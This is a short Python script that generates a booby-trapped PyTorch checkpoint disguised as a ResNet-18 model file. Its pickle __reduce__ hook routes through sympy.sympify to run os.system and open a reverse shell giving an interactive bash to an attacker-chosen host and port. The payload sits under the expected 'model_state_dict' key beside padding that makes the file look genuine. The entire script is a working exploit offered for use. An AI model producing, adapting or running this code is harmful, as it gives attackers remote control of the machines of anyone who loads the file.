#!/usr/bin/env python3
import torch
import sympy
import sys

LHOST = sys.argv[1] if len(sys.argv) > 1 else "localhost"
LPORT = sys.argv[2] if len(sys.argv) > 2 else "8899"
OUT   = sys.argv[3] if len(sys.argv) > 3 else "resnet18_v7.pt"

class SympifyRevShell:
    def __reduce__(self):
        return (sympy.sympify, (
            f"__import__('os').system("
            f"'python3 -c \\'import socket,subprocess,os;"
            f"s=socket.socket();"
            f"s.connect((\"{LHOST}\",{LPORT}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/bash\",\"-i\"])\\''"
            f")",
        ))

# Create a large dummy tensor for padding (~1 MB)
padding_tensor = torch.zeros(1024 * 1024, dtype=torch.uint8)  # 1,048,576 bytes

# Save a dictionary with keys expected by typical PyTorch loaders
checkpoint = {
    'model_state_dict': SympifyRevShell(),  # malicious payload under expected key
    'padding': padding_tensor
}

torch.save(checkpoint, OUT)
print(f"[+] {OUT} -> {LHOST}:{LPORT}")
